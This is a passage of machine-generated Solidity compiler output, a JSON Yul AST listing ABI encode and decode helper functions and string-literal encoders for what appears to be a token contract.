15","statements":[{"expression":{"arguments":[],"functionName":{"name":"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b","nodeType":"YulIdentifier","src":"4016:77:15"},"nodeType":"YulFunctionCall","src":"4016:79:15"},"nodeType":"YulExpressionStatement","src":"4016:79:15"}]},"condition":{"arguments":[{"arguments":[{"name":"dataEnd","nodeType":"YulIdentifier","src":"3989:7:15"},{"name":"headStart","nodeType":"YulIdentifier","src":"3998:9:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"3985:3:15"},"nodeType":"YulFunctionCall","src":"3985:23:15"},{"kind":"number","nodeType":"YulLiteral","src":"4010:2:15","type":"","value":"64"}],"functionName":{"name":"slt","nodeType":"YulIdentifier","src":"3981:3:15"},"nodeType":"YulFunctionCall","src":"3981:32:15"},"nodeType":"YulIf","src":"3978:119:15"},{"nodeType":"YulBlock","src":"4107:117:15","statements":[{"nodeType":"YulVariableDeclaration","src":"4122:15:15","value":{"kind":"number","nodeType":"YulLiteral","src":"4136:1:15","type":"","value":"0"},"variables":[{"name":"offset","nodeType":"YulTypedName","src":"4126:6:15","type":""}]},{"nodeType":"YulAssignment","src":"4151:63:15","value":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"4186:9:15"},{"name":"offset","nodeType":"YulIdentifier","src":"4197:6:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"4182:3:15"},"nodeType":"YulFunctionCall","src":"4182:22:15"},{"name":"dataEnd","nodeType":"YulIdentifier","src":"4206:7:15"}],"functionName":{"name":"abi_decode_t_address","nodeType":"YulIdentifier","src":"4161:20:15"},"nodeType":"YulFunctionCall","src":"4161:53:15"},"variableNames":[{"name":"value0","nodeType":"YulIdentifier","src":"4151:6:15"}]}]},{"nodeType":"YulBlock","src":"4234:115:15","statements":[{"nodeType":"YulVariableDeclaration","src":"4249:16:15","value":{"kind":"number","nodeType":"YulLiteral","src":"4263:2:15","type":"","value":"32"},"variables":[{"name":"offset","nodeType":"YulTypedName","src":"4253:6:15","type":""}]},{"nodeType":"YulAssignment","src":"4279:60:15","value":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"4311:9:15"},{"name":"offset","nodeType":"YulIdentifier","src":"4322:6:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"4307:3:15"},"nodeType":"YulFunctionCall","src":"4307:22:15"},{"name":"dataEnd","nodeType":"YulIdentifier","src":"4331:7:15"}],"functionName":{"name":"abi_decode_t_bool","nodeType":"YulIdentifier","src":"4289:17:15"},"nodeType":"YulFunctionCall","src":"4289:50:15"},"variableNames":[{"name":"value1","nodeType":"YulIdentifier","src":"4279:6:15"}]}]}]},"name":"abi_decode_tuple_t_addresst_bool","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"3930:9:15","type":""},{"name":"dataEnd","nodeType":"YulTypedName","src":"3941:7:15","type":""}],"returnVariables":[{"name":"value0","nodeType":"YulTypedName","src":"3953:6:15","type":""},{"name":"value1","nodeType":"YulTypedName","src":"3961:6:15","type":""}],"src":"3888:468:15"},{"body":{"nodeType":"YulBlock","src":"4445:391:15","statements":[{"body":{"nodeType":"YulBlock","src":"4491:83:15","statements":[{"expression":{"arguments":[],"functionName":{"name":"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b","nodeType":"YulIdentifier","src":"4493:77:15"},"nodeType":"YulFunctionCall","src":"4493:79:15"},"nodeType":"YulExpressionStatement","src":"4493:79:15"}]},"condition":{"arguments":[{"arguments":[{"name":"dataEnd","nodeType":"YulIdentifier","src":"4466:7:15"},{"name":"headStart","nodeType":"YulIdentifier","src":"4475:9:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"4462:3:15"},"nodeType":"YulFunctionCall","src":"4462:23:15"},{"kind":"number","nodeType":"YulLiteral","src":"4487:2:15","type":"","value":"64"}],"functionName":{"name":"slt","nodeType":"YulIdentifier","src":"4458:3:15"},"nodeType":"YulFunctionCall","src":"4458:32:15"},"nodeType":"YulIf","src":"4455:119:15"},{"nodeType":"YulBlock","src":"4584:117:15","statements":[{"nodeType":"YulVariableDeclaration","src":"4599:15:15","value":{"kind":"number","nodeType":"YulLiteral","src":"4613:1:15","type":"","value":"0"},"variables":[{"name":"offset","nodeType":"YulTypedName","src":"4603:6:15","type":""}]},{"nodeType":"YulAssignment","src":"4628:63:15","value":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"4663:9:15"},{"name":"offset","nodeType":"YulIdentifier","src":"4674:6:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"4659:3:15"},"nodeType":"YulFunctionCall","src":"4659:22:15"},{"name":"dataEnd","nodeType":"YulIdentifier","src":"4683:7:15"}],"functionName":{"name":"abi_decode_t_address","nodeType":"YulIdentifier","src":"4638:20:15"},"nodeType":"YulFunctionCall","src":"4638:53:15"},"variableNames":[{"name":"value0","nodeType":"YulIdentifier","src":"4628:6:15"}]}]},{"nodeType":"YulBlock","src":"4711:118:15","statements":[{"nodeType":"YulVariableDeclaration","src":"4726:16:15","value":{"kind":"number","nodeType":"YulLiteral","src":"4740:2:15","type":"","value":"32"},"variables":[{"name":"offset","nodeType":"YulTypedName","src":"4730:6:15","type":""}]},{"nodeType":"YulAssignment","src":"4756:63:15","value":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"4791:9:15"},{"name":"offset","nodeType":"YulIdentifier","src":"4802:6:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"4787:3:15"},"nodeType":"YulFunctionCall","src":"4787:22:15"},{"name":"dataEnd","nodeType":"YulIdentifier","src":"4811:7:15"}],"functionName":{"name":"abi_decode_t_uint256","nodeType":"YulIdentifier","src":"4766:20:15"},"nodeType":"YulFunctionCall","src":"4766:53:15"},"variableNames":[{"name":"value1","nodeType":"YulIdentifier","src":"4756:6:15"}]}]}]},"name":"abi_decode_tuple_t_addresst_uint256","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"4407:9:15","type":""},{"name":"dataEnd","nodeType":"YulTypedName","src":"4418:7:15","type":""}],"returnVariables":[{"name":"value0","nodeType":"YulTypedName","src":"4430:6:15","type":""},{"name":"value1","nodeType":"YulTypedName","src":"4438:6:15","type":""}],"src":"4362:474:15"},{"body":{"nodeType":"YulBlock","src":"4907:262:15","statements":[{"body":{"nodeType":"YulBlock","src":"4953:83:15","statements":[{"expression":{"arguments":[],"functionName":{"name":"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b","nodeType":"YulIdentifier","src":"4955:77:15"},"nodeType":"YulFunctionCall","src":"4955:79:15"},"nodeType":"YulExpressionStatement","src":"4955:79:15"}]},"condition":{"arguments":[{"arguments":[{"name":"dataEnd","nodeType":"YulIdentifier","src":"4928:7:15"},{"name":"headStart","nodeType":"YulIdentifier","src":"4937:9:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"4924:3:15"},"nodeType":"YulFunctionCall","src":"4924:23:15"},{"kind":"number","nodeType":"YulLiteral","src":"4949:2:15","type":"","value":"32"}],"functionName":{"name":"slt","nodeType":"YulIdentifier","src":"4920:3:15"},"nodeType":"YulFunctionCall","src":"4920:32:15"},"nodeType":"YulIf","src":"4917:119:15"},{"nodeType":"YulBlock","src":"5046:116:15","statements":[{"nodeType":"YulVariableDeclaration","src":"5061:15:15","value":{"kind":"number","nodeType":"YulLiteral","src":"5075:1:15","type":"","value":"0"},"variables":[{"name":"offset","nodeType":"YulTypedName","src":"5065:6:15","type":""}]},{"nodeType":"YulAssignment","src":"5090:62:15","value":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"5124:9:15"},{"name":"offset","nodeType":"YulIdentifier","src":"5135:6:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"5120:3:15"},"nodeType":"YulFunctionCall","src":"5120:22:15"},{"name":"dataEnd","nodeType":"YulIdentifier","src":"5144:7:15"}],"functionName":{"name":"abi_decode_t_bytes4","nodeType":"YulIdentifier","src":"5100:19:15"},"nodeType":"YulFunctionCall","src":"5100:52:15"},"variableNames":[{"name":"value0","nodeType":"YulIdentifier","src":"5090:6:15"}]}]}]},"name":"abi_decode_tuple_t_bytes4","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"4877:9:15","type":""},{"name":"dataEnd","nodeType":"YulTypedName","src":"4888:7:15","type":""}],"returnVariables":[{"name":"value0","nodeType":"YulTypedName","src":"4900:6:15","type":""}],"src":"4842:327:15"},{"body":{"nodeType":"YulBlock","src":"5251:273:15","statements":[{"body":{"nodeType":"YulBlock","src":"5297:83:15","statements":[{"expression":{"arguments":[],"functionName":{"name":"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b","nodeType":"YulIdentifier","src":"5299:77:15"},"nodeType":"YulFunctionCall","src":"5299:79:15"},"nodeType":"YulExpressionStatement","src":"5299:79:15"}]},"condition":{"arguments":[{"arguments":[{"name":"dataEnd","nodeType":"YulIdentifier","src":"5272:7:15"},{"name":"headStart","nodeType":"YulIdentifier","src":"5281:9:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"5268:3:15"},"nodeType":"YulFunctionCall","src":"5268:23:15"},{"kind":"number","nodeType":"YulLiteral","src":"5293:2:15","type":"","value":"32"}],"functionName":{"name":"slt","nodeType":"YulIdentifier","src":"5264:3:15"},"nodeType":"YulFunctionCall","src":"5264:32:15"},"nodeType":"YulIf","src":"5261:119:15"},{"nodeType":"YulBlock","src":"5390:127:15","statements":[{"nodeType":"YulVariableDeclaration","src":"5405:15:15","value":{"kind":"number","nodeType":"YulLiteral","src":"5419:1:15","type":"","value":"0"},"variables":[{"name":"offset","nodeType":"YulTypedName","src":"5409:6:15","type":""}]},{"nodeType":"YulAssignment","src":"5434:73:15","value":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"5479:9:15"},{"name":"offset","nodeType":"YulIdentifier","src":"5490:6:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"5475:3:15"},"nodeType":"YulFunctionCall","src":"5475:22:15"},{"name":"dataEnd","nodeType":"YulIdentifier","src":"5499:7:15"}],"functionName":{"name":"abi_decode_t_bytes4_fromMemory","nodeType":"YulIdentifier","src":"5444:30:15"},"nodeType":"YulFunctionCall","src":"5444:63:15"},"variableNames":[{"name":"value0","nodeType":"YulIdentifier","src":"5434:6:15"}]}]}]},"name":"abi_decode_tuple_t_bytes4_fromMemory","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"5221:9:15","type":""},{"name":"dataEnd","nodeType":"YulTypedName","src":"5232:7:15","type":""}],"returnVariables":[{"name":"value0","nodeType":"YulTypedName","src":"5244:6:15","type":""}],"src":"5175:349:15"},{"body":{"nodeType":"YulBlock","src":"5596:263:15","statements":[{"body":{"nodeType":"YulBlock","src":"5642:83:15","statements":[{"expression":{"arguments":[],"functionName":{"name":"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b","nodeType":"YulIdentifier","src":"5644:77:15"},"nodeType":"YulFunctionCall","src":"5644:79:15"},"nodeType":"YulExpressionStatement","src":"5644:79:15"}]},"condition":{"arguments":[{"arguments":[{"name":"dataEnd","nodeType":"YulIdentifier","src":"5617:7:15"},{"name":"headStart","nodeType":"YulIdentifier","src":"5626:9:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"5613:3:15"},"nodeType":"YulFunctionCall","src":"5613:23:15"},{"kind":"number","nodeType":"YulLiteral","src":"5638:2:15","type":"","value":"32"}],"functionName":{"name":"slt","nodeType":"YulIdentifier","src":"5609:3:15"},"nodeType":"YulFunctionCall","src":"5609:32:15"},"nodeType":"YulIf","src":"5606:119:15"},{"nodeType":"YulBlock","src":"5735:117:15","statements":[{"nodeType":"YulVariableDeclaration","src":"5750:15:15","value":{"kind":"number","nodeType":"YulLiteral","src":"5764:1:15","type":"","value":"0"},"variables":[{"name":"offset","nodeType":"YulTypedName","src":"5754:6:15","type":""}]},{"nodeType":"YulAssignment","src":"5779:63:15","value":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"5814:9:15"},{"name":"offset","nodeType":"YulIdentifier","src":"5825:6:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"5810:3:15"},"nodeType":"YulFunctionCall","src":"5810:22:15"},{"name":"dataEnd","nodeType":"YulIdentifier","src":"5834:7:15"}],"functionName":{"name":"abi_decode_t_uint256","nodeType":"YulIdentifier","src":"5789:20:15"},"nodeType":"YulFunctionCall","src":"5789:53:15"},"variableNames":[{"name":"value0","nodeType":"YulIdentifier","src":"5779:6:15"}]}]}]},"name":"abi_decode_tuple_t_uint256","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"5566:9:15","type":""},{"name":"dataEnd","nodeType":"YulTypedName","src":"5577:7:15","type":""}],"returnVariables":[{"name":"value0","nodeType":"YulTypedName","src":"5589:6:15","type":""}],"src":"5530:329:15"},{"body":{"nodeType":"YulBlock","src":"5930:53:15","statements":[{"expression":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"5947:3:15"},{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"5970:5:15"}],"functionName":{"name":"cleanup_t_address","nodeType":"YulIdentifier","src":"5952:17:15"},"nodeType":"YulFunctionCall","src":"5952:24:15"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"5940:6:15"},"nodeType":"YulFunctionCall","src":"5940:37:15"},"nodeType":"YulExpressionStatement","src":"5940:37:15"}]},"name":"abi_encode_t_address_to_t_address_fromStack","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nodeType":"YulTypedName","src":"5918:5:15","type":""},{"name":"pos","nodeType":"YulTypedName","src":"5925:3:15","type":""}],"src":"5865:118:15"},{"body":{"nodeType":"YulBlock","src":"6048:50:15","statements":[{"expression":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"6065:3:15"},{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"6085:5:15"}],"functionName":{"name":"cleanup_t_bool","nodeType":"YulIdentifier","src":"6070:14:15"},"nodeType":"YulFunctionCall","src":"6070:21:15"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"6058:6:15"},"nodeType":"YulFunctionCall","src":"6058:34:15"},"nodeType":"YulExpressionStatement","src":"6058:34:15"}]},"name":"abi_encode_t_bool_to_t_bool_fromStack","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nodeType":"YulTypedName","src":"6036:5:15","type":""},{"name":"pos","nodeType":"YulTypedName","src":"6043:3:15","type":""}],"src":"5989:109:15"},{"body":{"nodeType":"YulBlock","src":"6194:270:15","statements":[{"nodeType":"YulVariableDeclaration","src":"6204:52:15","value":{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"6250:5:15"}],"functionName":{"name":"array_length_t_bytes_memory_ptr","nodeType":"YulIdentifier","src":"6218:31:15"},"nodeType":"YulFunctionCall","src":"6218:38:15"},"variables":[{"name":"length","nodeType":"YulTypedName","src":"6208:6:15","type":""}]},{"nodeType":"YulAssignment","src":"6265:77:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"6330:3:15"},{"name":"length","nodeType":"YulIdentifier","src":"6335:6:15"}],"functionName":{"name":"array_storeLengthForEncoding_t_bytes_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"6272:57:15"},"nodeType":"YulFunctionCall","src":"6272:70:15"},"variableNames":[{"name":"pos","nodeType":"YulIdentifier","src":"6265:3:15"}]},{"expression":{"arguments":[{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"6377:5:15"},{"kind":"number","nodeType":"YulLiteral","src":"6384:4:15","type":"","value":"0x20"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"6373:3:15"},"nodeType":"YulFunctionCall","src":"6373:16:15"},{"name":"pos","nodeType":"YulIdentifier","src":"6391:3:15"},{"name":"length","nodeType":"YulIdentifier","src":"6396:6:15"}],"functionName":{"name":"copy_memory_to_memory","nodeType":"YulIdentifier","src":"6351:21:15"},"nodeType":"YulFunctionCall","src":"6351:52:15"},"nodeType":"YulExpressionStatement","src":"6351:52:15"},{"nodeType":"YulAssignment","src":"6412:46:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"6423:3:15"},{"arguments":[{"name":"length","nodeType":"YulIdentifier","src":"6450:6:15"}],"functionName":{"name":"round_up_to_mul_of_32","nodeType":"YulIdentifier","src":"6428:21:15"},"nodeType":"YulFunctionCall","src":"6428:29:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"6419:3:15"},"nodeType":"YulFunctionCall","src":"6419:39:15"},"variableNames":[{"name":"end","nodeType":"YulIdentifier","src":"6412:3:15"}]}]},"name":"abi_encode_t_bytes_memory_ptr_to_t_bytes_memory_ptr_fromStack","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nodeType":"YulTypedName","src":"6175:5:15","type":""},{"name":"pos","nodeType":"YulTypedName","src":"6182:3:15","type":""}],"returnVariables":[{"name":"end","nodeType":"YulTypedName","src":"6190:3:15","type":""}],"src":"6104:360:15"},{"body":{"nodeType":"YulBlock","src":"6562:272:15","statements":[{"nodeType":"YulVariableDeclaration","src":"6572:53:15","value":{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"6619:5:15"}],"functionName":{"name":"array_length_t_string_memory_ptr","nodeType":"YulIdentifier","src":"6586:32:15"},"nodeType":"YulFunctionCall","src":"6586:39:15"},"variables":[{"name":"length","nodeType":"YulTypedName","src":"6576:6:15","type":""}]},{"nodeType":"YulAssignment","src":"6634:78:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"6700:3:15"},{"name":"length","nodeType":"YulIdentifier","src":"6705:6:15"}],"functionName":{"name":"array_storeLengthForEncoding_t_string_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"6641:58:15"},"nodeType":"YulFunctionCall","src":"6641:71:15"},"variableNames":[{"name":"pos","nodeType":"YulIdentifier","src":"6634:3:15"}]},{"expression":{"arguments":[{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"6747:5:15"},{"kind":"number","nodeType":"YulLiteral","src":"6754:4:15","type":"","value":"0x20"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"6743:3:15"},"nodeType":"YulFunctionCall","src":"6743:16:15"},{"name":"pos","nodeType":"YulIdentifier","src":"6761:3:15"},{"name":"length","nodeType":"YulIdentifier","src":"6766:6:15"}],"functionName":{"name":"copy_memory_to_memory","nodeType":"YulIdentifier","src":"6721:21:15"},"nodeType":"YulFunctionCall","src":"6721:52:15"},"nodeType":"YulExpressionStatement","src":"6721:52:15"},{"nodeType":"YulAssignment","src":"6782:46:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"6793:3:15"},{"arguments":[{"name":"length","nodeType":"YulIdentifier","src":"6820:6:15"}],"functionName":{"name":"round_up_to_mul_of_32","nodeType":"YulIdentifier","src":"6798:21:15"},"nodeType":"YulFunctionCall","src":"6798:29:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"6789:3:15"},"nodeType":"YulFunctionCall","src":"6789:39:15"},"variableNames":[{"name":"end","nodeType":"YulIdentifier","src":"6782:3:15"}]}]},"name":"abi_encode_t_string_memory_ptr_to_t_string_memory_ptr_fromStack","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nodeType":"YulTypedName","src":"6543:5:15","type":""},{"name":"pos","nodeType":"YulTypedName","src":"6550:3:15","type":""}],"returnVariables":[{"name":"end","nodeType":"YulTypedName","src":"6558:3:15","type":""}],"src":"6470:364:15"},{"body":{"nodeType":"YulBlock","src":"6986:220:15","statements":[{"nodeType":"YulAssignment","src":"6996:74:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"7062:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"7067:2:15","type":"","value":"45"}],"functionName":{"name":"array_storeLengthForEncoding_t_string_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"7003:58:15"},"nodeType":"YulFunctionCall","src":"7003:67:15"},"variableNames":[{"name":"pos","nodeType":"YulIdentifier","src":"6996:3:15"}]},{"expression":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"7168:3:15"}],"functionName":{"name":"store_literal_in_memory_12a8e5623d251e191fe4a291d9a59bcc01a4db7a1f5c20fc8de44358c18308af","nodeType":"YulIdentifier","src":"7079:88:15"},"nodeType":"YulFunctionCall","src":"7079:93:15"},"nodeType":"YulExpressionStatement","src":"7079:93:15"},{"nodeType":"YulAssignment","src":"7181:19:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"7192:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"7197:2:15","type":"","value":"64"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"7188:3:15"},"nodeType":"YulFunctionCall","src":"7188:12:15"},"variableNames":[{"name":"end","nodeType":"YulIdentifier","src":"7181:3:15"}]}]},"name":"abi_encode_t_stringliteral_12a8e5623d251e191fe4a291d9a59bcc01a4db7a1f5c20fc8de44358c18308af_to_t_string_memory_ptr_fromStack","nodeType":"YulFunctionDefinition","parameters":[{"name":"pos","nodeType":"YulTypedName","src":"6974:3:15","type":""}],"returnVariables":[{"name":"end","nodeType":"YulTypedName","src":"6982:3:15","type":""}],"src":"6840:366:15"},{"body":{"nodeType":"YulBlock","src":"7358:220:15","statements":[{"nodeType":"YulAssignment","src":"7368:74:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"7434:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"7439:2:15","type":"","value":"50"}],"functionName":{"name":"array_storeLengthForEncoding_t_string_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"7375:58:15"},"nodeType":"YulFunctionCall","src":"7375:67:15"},"variableNames":[{"name":"pos","nodeType":"YulIdentifier","src":"7368:3:15"}]},{"expression":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"7540:3:15"}],"functionName":{"name":"store_literal_in_memory_1e766a06da43a53d0f4c380e06e5a342e14d5af1bf8501996c844905530ca84e","nodeType":"YulIdentifier","src":"7451:88:15"},"nodeType":"YulFunctionCall","src":"7451:93:15"},"nodeType":"YulExpressionStatement","src":"7451:93:15"},{"nodeType":"YulAssignment","src":"7553:19:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"7564:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"7569:2:15","type":"","value":"64"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"7560:3:15"},"nodeType":"YulFunctionCall","src":"7560:12:15"},"variableNames":[{"name":"end","nodeType":"YulIdentifier","src":"7553:3:15"}]}]},"name":"abi_encode_t_stringliteral_1e766a06da43a53d0f4c380e06e5a342e14d5af1bf8501996c844905530ca84e_to_t_string_memory_ptr_fromStack","nodeType":"YulFunctionDefinition","parameters":[{"name":"pos","nodeType":"YulTypedName","src":"7346:3:15","type":""}],"returnVariables":[{"name":"end","nodeType":"YulTypedName","src":"7354:3:15","type":""}],"src":"7212:366:15"},{"body":{"nodeType":"YulBlock","src":"7730:220:15","statements":[{"nodeType":"YulAssignment","src":"7740:74:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"7806:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"7811:2:15","type":"","value":"37"}],"functionName":{"name":"array_storeLengthForEncoding_t_string_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"7747:58:15"},"nodeType":"YulFunctionCall","src":"7747:67:15"},"variableNames":[{"name":"pos","nodeType":"YulIdentifier","src":"7740:3:15"}]},{"expression":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"7912:3:15"}],"functionName":{"name":"store_literal_in_memory_277f8ee9d5b4fc3c4149386f24de0fc1bbc63a8210e2197bfd1c0376a2ac5f48","nodeType":"YulIdentifier","src":"7823:88:15"},"nodeType":"YulFunctionCall","src":"7823:93:15"},"nodeType":"YulExpressionStatement","src":"7823:93:15"},{"nodeType":"YulAssignment","src":"7925:19:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"7936:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"7941:2:15","type":"","value":"64"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"7932:3:15"},"nodeType":"YulFunctionCall","src":"7932:12:15"},"variableNames":[{"name":"end","nodeType":"YulIdentifier","src":"7925:3:15"}]}]},"name":"abi_encode_t_stringliteral_277f8ee9d5b4fc3c4149386f24de0fc1bbc63a8210e2197bfd1c0376a2ac5f48_to_t_string_memory_ptr_fromStack","nodeType":"YulFunctionDefinition","parameters":[{"name":"pos","nodeType":"YulTypedName","src":"7718:3:15","type":""}],"returnVariables":[{"name":"end","nodeType":"YulTypedName","src":"7726:3:15","type":""}],"src":"7584:366:15"},{"body":{"nodeType":"YulBlock","src":"8102:220:15","statements":[{"nodeType":"YulAssignment","src":"8112:74:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"8178:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"8183:2:15","type":"","value":"28"}],"functionName":{"name":"array_storeLengthForEncoding_t_string_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"8119:58:15"},"nodeType":"YulFunctionCall","src":"8119:67:15"},"variableNames":[{"name":"pos","nodeType":"YulIdentifier","src":"8112:3:15"}]},{"expression":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"8284:3:15"}],"functionName":{"name":"store_literal_in_memory_2a63ce106ef95058ed21fd07c42a10f11dc5c32ac13a4e847923f7759f635d57","nodeType":"YulIdentifier","src":"8195:88:15"},"nodeType":"YulFunctionCall","src":"8195:93:15"},"nodeType":"YulExpressionStatement","src":"8195:93:15"},{"nodeType":"YulAssignment","src":"8297:19:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"8308:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"8313:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"8304:3:15"},"nodeType":"YulFunctionCall","src":"8304:12:15"},"variableNames":[{"name":"end","nodeType":"YulIdentifier","src":"8297:3:15"}]}]},"name":"abi_encode_t_stringliteral_2a63ce106ef95058ed21fd07c42a10f11dc5c32ac13a4e847923f7759f635d57_to_t_string_memory_ptr_fromStack","nodeType":"YulFunctionDefinition","parameters":[{"name":"pos","nodeType":"YulTypedName","src":"8090:3:15","type":""}],"returnVariables":[{"name":"end","nodeType":"YulTypedName","src":"8098:3:15","type":""}],"src":"7956:366:15"},{"body":{"nodeType":"YulBlock","src":"8474:220:15","statements":[{"nodeType":"YulAssignment","src":"8484:74:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"8550:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"8555:2:15","type":"","value":"36"}],"functionName":{"name":"array_storeLengthForEncoding_t_string_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"8491:58:15"},"nodeType":"YulFunctionCall","src":"8491:67:15"},"variableNames":[{"name":"pos","nodeType":"YulIdentifier","src":"8484:3:15"}]},{"expression":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"8656:3:15"}],"functionName":{"name":"store_literal_in_memory_455fea98ea03c32d7dd1a6f1426917d80529bf47b3ccbde74e7206e889e709f4","nodeType":"YulIdentifier","src":"8567:88:15"},"nodeType":"YulFunctionCall","src":"8567:93:15"},"nodeType":"YulExpressionStatement","src":"8567:93:15"},{"nodeType":"YulAssignment","src":"8669:19:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"8680:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"8685:2:15","type":"","value":"64"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"8676:3:15"},"nodeType":"YulFunctionCall","src":"8676:12:15"},"variableNames":[{"name":"end","nodeType":"YulIdentifier","src":"8669:3:15"}]}]},"name":"abi_encode_t_stringliteral_455fea98ea03c32d7dd1a6f1426917d80529bf47b3ccbde74e7206e889e709f4_to_t_string_memory_ptr_fromStack","nodeType":"YulFunctionDefinition","parameters":[{"name":"pos","nodeType":"YulTypedName","src":"8462:3:15","type":""}],"returnVariables":[{"name":"end","nodeType":"YulTypedName","src":"8470:3:15","type":""}],"src":"8328:366:15"},{"body":{"nodeType":"YulBlock","src":"8846:220:15","statements":[{"nodeType":"YulAssignment","src":"8856:74:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"8922:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"8927:2:15","type":"","value":"25"}],"functionName":{"name":"array_storeLengthForEncoding_t_string_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"8863:58:15"},"nodeType":"YulFunctionCall","src":"8863:67:15"},"variableNames":[{"name":"pos","nodeType":"YulIdentifier","src":"8856:3:15"}]},{"expression":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"9028:3:15"}],"functionName":{"name":"store_literal_in_memory_45fe4329685be5ecd250fd0e6a25aea0ea4d0e30fb6a73c118b95749e6d70d05","nodeType":"YulIdentifier","src":"8939:88:15"},"nodeType":"YulFunctionCall","src":"8939:93:15"},"nodeType":"YulExpressionStatement","src":"8939:93:15"},{"nodeType":"YulAssignment","src":"9041:19:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"9052:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"9057:2:15","type":"","value":"32"}